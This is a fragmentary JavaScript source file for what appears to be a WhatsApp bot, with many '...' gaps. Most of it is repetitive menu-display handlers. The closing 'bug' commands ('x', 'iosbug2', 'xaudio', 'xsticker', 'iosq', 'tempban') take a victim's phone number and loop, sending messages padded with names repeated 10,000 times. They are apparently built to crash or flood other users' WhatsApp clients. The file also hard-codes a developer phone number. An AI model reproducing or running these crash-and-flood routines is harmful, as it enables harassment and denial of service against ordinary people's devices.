	...
	if (!XeonTheCreator) return XeonStickOwner()
            ...
            if (text.split("|") < 2)
                return await replygcxeon(
                    `Mention question and atleast 2 options\nContoh: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
            let options = []
...
if (!q.includes("@")) return replygcxeon(`Usage Contoh: ${prefix+command} *Item Name@Item*\n\n_Contoh_\n\n${prefix+command} namelist@List`)
...
if (!q) return replygcxeon(`Usage Contoh: ${prefix + command} *Item name*\n\n_Contoh_\n\n${prefix + command} listname`)
...
break
case 'indo-ai': {
	if (!text) return replygcxeon(`*• Contoh:* ${usedPrefix + command} halo`)
try {
...
break
case 'photoleap': {
	if (!text) return replygcxeon(`*• Contoh:* ${usedPrefix + command} blue sea`);
...
case 'ai':
case 'openai': {
	if (!text) return replygcxeon(`*• Contoh:* ${prefix + command} what is your name`);   
...
break
case 'stickersearch': {
if (!text) return replygcxeon(`Contoh : ${m.prefix + command} kururmi`)
...
break
case 'apksearch': {
if (!text) return replygcxeon(`Contoh : ${prefix + command} whatsapp`)
...
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/eb5950cb1c1c99f5bc1dd.jpg",
...
XeonBotInc.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/lagu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted : m })  } else if (typemenu === 'v10') {
        ...
        interactiveMessage: proto.Message.InteractiveMessage.create({
          ...
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              ...
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://chat.whatsapp.com/HL8oaxQMOFkChPd1UbkgRK\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
...
break
            ...
            case 'allmenu': {
let xmenu_oh = `Hi ${pushname}${allmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
            case 'ownermenu': {
let xmenu_oh = `Hi ${pushname}${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'othermenu': {
let xmenu_oh = `Hi ${pushname}${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'downloadmenu': {
let xmenu_oh = `Hi ${pushname}${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'groupmenu': {
let xmenu_oh = `Hi ${pushname}${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'gamemenu': {
let xmenu_oh = `Hi ${pushname}${gamemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'funmenu': {
let xmenu_oh = `Hi ${pushname}${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'stalkermenu': {
let xmenu_oh = `Hi ${pushname}${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
let xmenu_oh = `Hi ${pushname}${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
let xmenu_oh = `Hi ${pushname}${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'photooxymenu': {
let xmenu_oh = `Hi ${pushname}${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'nsfwmenu': {
let xmenu_oh = `Hi ${pushname}${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'animemenu': {
let xmenu_oh = `Hi ${pushname}${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'stickermenu': {
let xmenu_oh = `Hi ${pushname}${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'databasemenu': {
let xmenu_oh = `Hi ${pushname}${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'searchmenu': {
let xmenu_oh = `Hi ${pushname}${searchmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'storemenu': {
let xmenu_oh = `Hi ${pushname}${storemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'aimenu': {
let xmenu_oh = `Hi ${pushname}${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'religionmenu': {
let xmenu_oh = `Hi ${pushname}${religionmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'listmenu': {
let xmenu_oh = `Hi ${pushname}${listmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'convertmenu': {
let xmenu_oh = `Hi ${pushname}${convertmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
break
case 'bugmenu': {
let xmenu_oh = `Hi ${pushname}${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
...
if (!m.quoted) return replygcxeon(`Contoh usage: ${prefix + command} reply chat`)
await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
...
await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'x': {
...
for (let i = 0; i < amount; i++) {
await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
...
case 'iosbug2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Contoh usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
...
case 'xaudio': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Contoh usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
...
case 'xsticker': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Contoh: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
...
case 'xsticker2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Contoh: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
...
case 'tempban': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Contoh: ${prefix + command} 91|6909137211`)
if (!/|/.test(text)) return replygcxeon(`The data you provided is invalid!, Contoh: \n ${prefix + command} 91|6909137211`)
...
case 'iosq':{
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nContoh ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
...
"sellerJid": "6289688206739@s.whatsapp.net",
...
XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
        ...
        let e = String(err)
XeonBotInc.sendMessage("6289688206739@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
